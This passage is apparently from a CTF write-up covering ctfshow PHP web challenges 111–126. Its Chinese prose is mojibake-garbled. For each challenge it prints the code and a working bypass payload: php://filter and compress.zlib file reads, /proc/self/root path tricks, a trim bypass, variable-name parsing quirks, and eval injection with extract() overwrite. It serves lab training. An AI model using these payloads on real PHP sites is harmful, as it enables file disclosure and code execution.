æ³•ä½¿ç”¨å¤–éƒ¨å˜é‡</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$GLOBALS</span> â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡</span><br>ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¯¹äºè¯¥é¢˜ï¼Œåªè¦æŠŠ$GLOBALSèµ‹å€¼ç»™v2ï¼Œç„¶åv2å†èµ‹å€¼ç»™v1,å³å¯å°†å…¨éƒ¨å˜é‡è¾“å‡º<br>payloadï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">v1</span>=ctfshow&amp;v2=GLOBALS<br></code></pre></td></tr></table></figure><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">highlight<span class="hljs-constructor">_file(<span class="hljs-params">__FILE__</span>)</span>;<br>error<span class="hljs-constructor">_reporting(0)</span>;<br><span class="hljs-keyword">function</span> filter($file)&#123;<br>    <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span>\.\.\<span class="hljs-operator">/</span>|<span class="hljs-params">http</span>|<span class="hljs-params">https</span>|<span class="hljs-params">data</span>|<span class="hljs-params">input</span>|<span class="hljs-params">rot13</span>|<span class="hljs-params">base64</span>|<span class="hljs-params">string</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>&#x27;,$<span class="hljs-params">file</span>)</span>)&#123;<br>        die(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        return $file;<br>    &#125;<br>&#125;<br>$file=$_GET<span class="hljs-literal">[&#x27;<span class="hljs-identifier">file</span>&#x27;]</span>;<br><span class="hljs-keyword">if</span>(! is<span class="hljs-constructor">_file($<span class="hljs-params">file</span>)</span>)&#123;<br>    highlight<span class="hljs-constructor">_file(<span class="hljs-params">filter</span>($<span class="hljs-params">file</span>)</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    echo <span class="hljs-string">&quot;hacker!&quot;</span>;<br>&#125; <br><br></code></pre></td></tr></table></figure><p><strong>is_file å‡½æ•°å¯ä»¥ä½¿ç”¨åŒ…è£…å™¨ ä¼ªåè®®æ¥ç»•è¿‡</strong><br><strong>ä¸å½±å“file_get_contents highlight_file</strong></p><p>if(!is_file($file)){è¡¨ç¤ºfileæ–‡ä»¶ä¸å­˜åœ¨æ‰èƒ½é€šè¿‡if<br>è€Œis_file()å’Œhighlight_file()éƒ½å¯é…åˆä¼ªåè®®<br>æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªä¼ªåè®®<code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p><p>åˆå› ä¸ºbase64è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬ä¸ä½¿ç”¨è½¬æ¢ï¼Œå»æ‰<code>/convert.base64-encode</code><br>æ‰€ä»¥</p><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(! <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!&quot;</span>;<br>&#125; <span class="hljs-meta">&lt;?php</span> <br><br></code></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç å¢åŠ äº†ä¸€ä¸ªå¯¹filterçš„æ­£åˆ™åŒ¹é…ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ä¸Šä¸€é¢˜çš„åŠæ³•ï¼Œæ‰¾ä¸€ä¸‹å…¶å®ƒçš„åè®®<br>payload:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">compress</span>.zlib:<span class="hljs-comment">//flag.php</span><br></code></pre></td></tr></table></figure><p>æ¢ç”¨è¯»å–å‹ç¼©æµ</p><p>linuxé‡Œ<code>/proc/self/root</code>æ˜¯æŒ‡å‘æ ¹ç›®å½•çš„ï¼Œä¹Ÿå°±æ˜¯å¦‚æœåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥<code>ls /proc/self/root</code>,å…¶å®æ˜¾ç¤ºçš„å†…å®¹æ˜¯æ ¹ç›®å½•ä¸‹çš„å†…å®¹ï¼Œå¤šæ¬¡é‡å¤åç»•è¿‡<code>is_file</code>ç›®å½•æº¢å‡ºis_fileåˆ¤æ–­ä¸ºä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶</p><p>payload:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>p<br>roc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root/pro<br>c<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span><br>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc/se<br>lf<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">error<span class="hljs-constructor">_reporting(0)</span>;<br>highlight<span class="hljs-constructor">_file(<span class="hljs-params">__FILE__</span>)</span>;<br><span class="hljs-keyword">function</span> filter($file)&#123;<br>    <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">compress</span>|<span class="hljs-params">root</span>|<span class="hljs-params">zip</span>|<span class="hljs-params">convert</span>|\.\.\<span class="hljs-operator">/</span>|<span class="hljs-params">http</span>|<span class="hljs-params">https</span>|<span class="hljs-params">data</span>|<span class="hljs-params">data</span>|<span class="hljs-params">rot13</span>|<span class="hljs-params">base64</span>|<span class="hljs-params">string</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>&#x27;,$<span class="hljs-params">file</span>)</span>)&#123;<br>        die(&#x27;hacker!&#x27;);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        return $file;<br>    &#125;<br>&#125;<br>$file=$_GET<span class="hljs-literal">[&#x27;<span class="hljs-identifier">file</span>&#x27;]</span>;<br>echo <span class="hljs-string">&quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;</span>;<br><span class="hljs-keyword">if</span>(! is<span class="hljs-constructor">_file($<span class="hljs-params">file</span>)</span>)&#123;<br>    highlight<span class="hljs-constructor">_file(<span class="hljs-params">filter</span>($<span class="hljs-params">file</span>)</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    echo <span class="hljs-string">&quot;hacker!&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™å›æ­£åˆ™åŒ¹é…åˆæ”¹å˜äº†ï¼Œè¿‡æ»¤äº†compressï¼Œå’Œrootï¼Œæ‰€ä»¥ä¸Šé¢˜çš„ä¸¤ç§æ–¹æ³•éƒ½ç”¨ä¸æˆäº†ï¼Œä½†æ˜¯å®ƒå¹¶æ²¡æœ‰è¿‡æ»¤filterï¼Œæ‰€ä»¥æœ¬é¢˜<br>payloadï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$num</span></span>)</span>&#123;<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;e&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-variable">$num</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-variable">$num</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$num</span>;<br>&#125;<br><span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$num</span>) <span class="hljs-keyword">and</span> <span class="hljs-variable">$num</span>!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$num</span>)!==<span class="hljs-string">&#x27;36&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$num</span>)==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-string">&#x27;36&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker!!!&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>is_numeric()å‡½æ•°åœ¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²<br>trim(string,charlist)å‡½æ•°ç”¨äºä¸€å¤„å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶å®ƒé¢„å®šä¹‰å­—ç¬¦ï¼Œå¦‚charlistæ²¡æœ‰å†…å®¹,trim()å°†å»é™¤è¿™äº›å­—ç¬¦</p><ul><li>â€œ â€œ(ASCII 32(0X20)) æ™®é€šç©ºæ ¼ç¬¦ã€‚</li><li>â€œ\tâ€(ASCII 9(0x09)) åˆ¶è¡¨ç¬¦ã€‚</li><li>â€œ\nâ€(ASCII 10(0x0A)) æ¢è¡Œç¬¦ã€‚</li><li>â€œ\râ€(ASCII 13(0x0D)) å›è½¦ç¬¦ã€‚</li><li>â€œ\0â€(ASCII 0(0x00)) ç©ºå­—èŠ‚ç¬¦ã€‚</li><li>â€œ\x0Bâ€(ASCII 11 (0x0B)) å‚ç›´åˆ¶è¡¨ç¬¦ã€‚</li></ul><p>payloadï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=%0C36<br></code></pre></td></tr></table></figure><p>asciiè¡¨ä¸­0cä¸ºæ¢é¡µç¬¦ï¼Œæ‰€ä»¥èƒ½ç»•è¿‡trim() ä¸”å¼±æ¯”è¾ƒä¸å½±å“ï¼Œfilter()ä¹Ÿä¸ºtrue<br>æ³¨ï¼š<br>num!&#x3D;&#x3D;36 ä¸ºå¼ºç±»å‹æ¯”è¾ƒï¼Œå› num&#x3D;%0c36ä¸36ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸ºtrueï¼Œ<code>if($num==&#39;36&#39;)&#123;</code>ä¸ºå¼±æ¯”è¾ƒä¹Ÿä¸ºtrueï¼Œæ‰€ä»¥éƒ½èƒ½é€šè¿‡</p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">18</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);  <br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125; <br><br></code></pre></td></tr></table></figure><p>åœ¨phpä¸­å˜é‡åå­—æ˜¯ç”±æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿ç»„æˆçš„ï¼Œæ‰€ä»¥ä¸è®ºç”¨postè¿˜æ˜¯getä¼ å…¥å˜é‡åçš„æ—¶å€™éƒ½å°†ç©ºæ ¼ã€+ã€ç‚¹ã€[è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œä½†æ˜¯ç”¨ä¸€ä¸ªç‰¹æ€§æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œå°±æ˜¯å½“[æå‰å‡ºç°åï¼Œåé¢çš„ç‚¹å°±ä¸ä¼šå†è¢«è½¬ä¹‰äº†ï¼Œä¾‹å¦‚ï¼š<code>CTF[SHOW.COM=&gt;CTF_SHOW.COM</code></p><p>if($fl0g&#x3D;&#x3D;&#x3D;â€flag_give_meâ€)ä¸å‰é¢ç¬¬ä¸€ä¸ªifæœ‰å†²çªï¼Œæ‰€ä»¥æˆ‘ä»¬å¼ƒç”¨è¿™ä¸ªif<br>eval()ä¸­å¯ä»¥è¿è¡Œphpä»£ç ï¼Œæ‰€ä»¥<br>payloadï¼š</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">POST:<br>CTF_SHOW=<span class="hljs-number">1</span>&amp;CTF[SHOW.COM=<span class="hljs-number">1</span>&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=echo $flag</span><br></code></pre></td></tr></table></figure><p>æ­£åˆ™åŒ¹é…é‡Œè¦æ±‚çš„c&lt;&#x3D;18ï¼Œåœ¨æœ¬åœ°éªŒè¯ä¸€ä¸‹æ˜¯å¦æ»¡è¶³</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;echo $flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>&lt;=<span class="hljs-number">18</span>);<br></code></pre></td></tr></table></figure><p>è¿”å›ç»“æœä¸ºtrue<br>æäº¤è·å¾—flag</p><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="hljs-variable">$c</span>)&amp;&amp;<span class="hljs-variable">$c</span>&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);<br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>å’Œä¸Šä¸€é¢˜ä¸ä¸€æ ·çš„æ˜¯ï¼Œå®ƒè¿‡æ»¤äº†flagå’Œecho<br>æ–¹æ³•ä¸€ï¼š<br>payload:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">POST:<br>CTF_SHOW=<span class="hljs-number">1</span>&amp;CTF[SHOW.COM=<span class="hljs-number">1</span>&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">highlight_file</span><span class="hljs-params">($_GET[<span class="hljs-number">1</span>])</span></span><br>GET:<br>?<span class="hljs-number">1</span>=flag.php<br></code></pre></td></tr></table></figure><p>å› ä¸ºifæŠŠfunä¸­çš„flagè¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™æ ·æ¥ç»•è¿‡è¿‡æ»¤</p><p>æ–¹æ³•äºŒï¼š<br>payload:</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">POST:<br>CTF_SHOW=<span class="hljs-number">1</span>&amp;CTF[SHOW.COM=<span class="hljs-number">2</span>&amp;<span class="hljs-function"><span class="hljs-keyword">fun</span>=<span class="hljs-title">extract</span><span class="hljs-params">($_POST)</span></span>&amp;fl0g=flag_give_me<br></code></pre></td></tr></table></figure><p>extractå˜é‡è¦†ç›–ï¼Œä½¿fl0gæœ‰å€¼é€šè¿‡æœ€åçš„if</p><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fun&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;fl0g&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">16</span>)&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>.<span class="hljs-string">&quot;;&quot;</span>);  <br>         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fl0g</span>===<span class="hljs-string">&quot;flag_give_me&quot;</span>)&#123;<br>             <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>         &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œç¦ç”¨äº†g i f c o dï¼Œå‰é¢çš„æ–¹æ³•éƒ½ä¸èƒ½ç”¨äº†<br>åˆ©ç”¨$_SERVER[â€˜argvâ€™]<br>$_SERVER[â€˜argvâ€™]æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(hearder)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”±webæœåŠ¡å™¨åˆ›å»ºã€‚<br><code>&#39;argv&#39;</code><br>ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°çš„æ•°ç»„ã€‚å½“è„šæœ¬ä»¥å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œæ—¶ï¼Œargvå˜é‡ä¼ é€’ç»™ç¨‹åºcè¯­è¨€æ ·å¼çš„å‘½ä»¤è¡Œå‚æ•°ã€‚å½“é€šè¿‡GETæ–¹å¼åˆ°ç”¨æ—¶ï¼Œè¯¥å˜é‡åŒ…å«query 